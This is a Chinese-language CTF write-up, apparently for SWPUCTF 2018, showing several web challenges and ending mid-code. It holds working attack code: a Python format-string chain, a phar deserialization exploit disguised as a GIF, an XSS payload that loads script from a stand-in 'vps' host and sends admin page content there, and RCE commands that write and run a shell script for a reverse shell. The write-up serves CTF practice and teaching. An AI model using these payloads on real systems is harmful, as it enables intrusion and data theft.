+<p>得到伪造session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJxNzTkKgDAURdG9vDpIohmMm5GfCUT9gkMl7t00grc8zb0RaCGOGYOSX40UiNvF5x8rHXsZz23OjAHG-ETKp1icddKEoK0nIt1mb5TWspSu613bQ-A68s601gUorRPjeQGJBCFC.XBd6uw.iqU7NNEiz04SQrIwPwcxbgjplPA</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-12-17-18-34-44.png" alt=""></p>
+<h3 id="格式化字符串攻击"><a href="#格式化字符串攻击" class="headerlink" title="格式化字符串攻击"></a>格式化字符串攻击</h3><p>然后就是最后的问题，怎么获取flag，我们看到关键函数<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getflag', methods=('POST',))</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    u = getattr(g, <span class="string">'u'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> u <span class="keyword">or</span> u.balance &lt; <span class="number">1000000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&#123;"s": -1, "msg": "error"&#125;'</span></span><br><span class="line">    field = request.form.get(<span class="string">'field'</span>, <span class="string">'username'</span>)</span><br><span class="line">    mhash = hashlib.sha256((<span class="string">'swpu++&#123;0.'</span> + field + <span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    jdata = <span class="string">'&#123;&#123;"&#123;0&#125;":'</span> + <span class="string">'"&#123;1.'</span> + field + <span class="string">'&#125;", "hash": "&#123;2&#125;"&#125;&#125;'</span></span><br><span class="line">    <span class="keyword">return</span> jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure></p>
+<p>联想到题目提示python3.5以及format，不难想到是格式化字符串的漏洞<br>那么剩下的应该是构造python继承链去读取g.flag<br>这里看到，我们的可控点是拼接在g.u后面的，所以我们需要上跳<br>而这里需要先知道g是什么：<br><img src="/images/2018-12-17-18-36-16.png" alt=""><br>很明显，如果我们需要读取g的值，我们需要一直上跳到app<br>而目前我们处于<br><img src="/images/2018-12-17-18-37-25.png" alt=""><br>很显然，结合<em>_init</em>.py，我们应该先跳到db，再跳到app<br>这里题目提示我们<br><img src="/images/2018-12-17-18-39-52.png" alt=""><br>于是我们尝试这个类中的save方法<br><img src="/images/2018-12-17-18-40-51.png" alt=""><br>可以发现db,于是我们继续上跳<br><img src="/images/2018-12-17-18-41-54.png" alt=""><br>发现存在<code>current_app</code><br>紧接着受到源码的启发<br><img src="/images/2018-12-17-18-43-39.png" alt=""><br>我们可以继续调用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">field=__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-12-17-18-44-14.png" alt=""><br>不难发现找到了g，我们查看flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">field=__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__[g].flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-12-17-18-44-51.png" alt=""><br>得到flag：<code>swpuctf{tHl$_15_4_f14G}</code></p>
+<h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><h3 id="信息搜集-2"><a href="#信息搜集-2" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>看了一下文件的功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读文件</span><br><span class="line">http://120.79.158.180:11115/file.php?file=</span><br><span class="line">上传文件</span><br><span class="line">http://120.79.158.180:11115/upload_file.php</span><br></pre></td></tr></table></figure></p>
+<p>于是尝试Leak一下源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.158.180:11115/file.php?file=file.php</span><br></pre></td></tr></table></figure></p>
+<p>file.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>; </span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>看到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file))</span><br></pre></td></tr></table></figure></p>
+<p>本能的想到了phar，于是去读class.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.158.180:11115/file.php?file=class.php</span><br></pre></td></tr></table></figure></p>
+<p>class.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>分析一下这个pop链<br>首先是show()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现过滤了<code>f1ag</code>，那么利用点肯定不是它了，接着读到Test类，发现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $text = base64_encode(file_get_contents($value));</span><br><span class="line">       <span class="keyword">return</span> $text;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
+<p>于是将目光锁定在Test类，那么开始想构造链<br>发现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
+<p>不难知道，这个方法要在调用不存在属性的时候才会被触发<br>又看回Show类，发现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">       <span class="keyword">return</span> $content;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里调用了source属性，只要将<code>str[&#39;str&#39;]</code>赋值为Test类即可<br>那么怎么触发<code>__toString</code>呢？<br>不难知道这个函数要在输出对象的时候才会被触发<br>看到C1e4r类<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现这里会进行对象输出，那么整个pop链就清晰了<br>1.利用C1e4r类的<code>__destruct()</code>中的<code>echo $this-&gt;test</code><br>2.触发Show类的<code>__toString()</code><br>3.利用Show类的<code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source</code><br>4.触发Test类的<code>__get()</code><br>5.成功利用<code>file_get()</code>读文件</p>
+<h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><p>思路清晰了，剩下的就是exp编写了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;params = <span class="keyword">array</span>(<span class="string">"source"</span>=&gt;<span class="string">'/var/www/html/f1ag.php'</span>);</span><br><span class="line">$b = <span class="keyword">new</span> Show(<span class="string">'index.php'</span>);</span><br><span class="line">$b-&gt;str[<span class="string">'str'</span>] = $a;</span><br><span class="line">$c= <span class="keyword">new</span> C1e4r($b);</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line">$obj = unserialize(<span class="string">'O:5:"C1e4r":2:&#123;s:4:"test";N;s:3:"str";O:4:"Show":2:&#123;s:6:"source";s:9:"index.php";s:3:"str";a:1:&#123;s:3:"str";O:4:"Test":2:&#123;s:4:"file";N;s:6:"params";a:1:&#123;s:6:"source";s:22:"/var/www/html/f1ag.php";&#125;&#125;&#125;&#125;&#125;'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exploit.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.php'</span>, <span class="string">'test'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class="line">$phar-&gt;setMetadata($obj);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'skyfuck.phar'</span>, <span class="string">'skyfuck.gif'</span>)</span><br></pre></td></tr></table></figure></p>
+<h3 id="getflag-1"><a href="#getflag-1" class="headerlink" title="getflag"></a>getflag</h3><p>上传skyfuck.gif<br>然后根据<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">".jpg"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>计算出路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4b8e34dafe69a6a5ec8ba799e46e8e92.jpg</span><br></pre></td></tr></table></figure></p>
+<p>触发反序列化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.158.180:11115/file.php?file=phar://upload/4b8e34dafe69a6a5ec8ba799e46e8e92.jpg</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-12-17-20-36-46.png" alt=""><br>解码<br><img src="/images/2018-12-17-20-36-56.png" alt=""><br>即可得到flag</p>
+<h2 id="有趣的邮箱注册"><a href="#有趣的邮箱注册" class="headerlink" title="有趣的邮箱注册"></a>有趣的邮箱注册</h2><h3 id="信息搜集-3"><a href="#信息搜集-3" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>拿到题目发现2个功能<br>1.管理员页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.89.56.208:6324/admin/admin.php</span><br></pre></td></tr></table></figure></p>
+<p>2.邮箱申请<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.89.56.208:6324/check.php</span><br></pre></td></tr></table></figure></p>
+<p>然后发现访问管理员页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">only localhost allowed!</span><br></pre></td></tr></table></figure></p>
+<p>那么思路比较明显了，需要用邮箱申请XSS去本地访问管理员页面，同时抓取页面内容<br>在check.php页面源代码发现代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--check.php</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'email'</span>]) &#123;</span><br><span class="line">$email = $_POST[<span class="string">'email'</span>];</span><br><span class="line"><span class="keyword">if</span>(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"error email, please check your email"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"等待管理员自动审核"</span>;</span><br><span class="line"><span class="keyword">echo</span> $email;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>随机想bypass<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var($email,FILTER_VALIDATE_EMAIL)</span><br></pre></td></tr></table></figure></p>
+<p>不难发现只要使用了引号包裹就可以进行xss<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script/src=//vps_ip/payload.js&gt;&lt;/script&gt;&quot;@example.com</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-12-18-18-09-29.png" alt=""><br>随机构造读源码脚本<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.location=<span class="string">'http://vps:23333/?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"admin.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-12-18-15-44-37.png" alt=""><br>解码后得到<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"admin/a0a.php?cmd=whoami"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>发现存在rce</p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>本能想到进行反弹shell，这样比较利于后续操作，于是改写脚本为<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.location=<span class="string">'http://vps:23333/?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">'http://localhost:6324/admin/a0a.php?cmd=echo%20"xxxxxxxxxxxxx"%20|%20base64%20-d%20&gt;%20/tmp/sky.sh'</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure></p>
+<p>向/tmp写入一个sky.sh<br>然后<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.location=<span class="string">'http://vps:23333/?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">'http://localhost:6324/admin/a0a.php?cmd=/bin/bash%20/tmp/sky.sh'</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-12-18-18-35-59.png" alt=""><br>在根目录发现flag，但是不可读<br><img src="/images/2018-12-18-18-36-25.png" alt=""></p>
+<h3 id="信息再次发掘"><a href="#信息再次发掘" class="headerlink" title="信息再次发掘"></a>信息再次发掘</h3><p>进一步寻找信息,在<code>/var/www/html</code>下发现<br><img src="/images/2018-12-18-18-38-00.png" alt=""><br>发现还有一个目录，于是进行查看<br><img src="/images/2018-12-18-18-38-33.png" alt=""><br>发现果然还有题目<br><img src="/images/2018-12-18-18-40-35.png" alt=""><br>然后查看代码<br>backup.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"upload.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"上传目录："</span> . $upload_dir . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">$sys = <span class="string">"tar -czf z.tar.gz *"</span>;</span><br><span class="line">chdir($upload_dir);</span><br><span class="line">system($sys);</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">'z.tar.gz'</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span 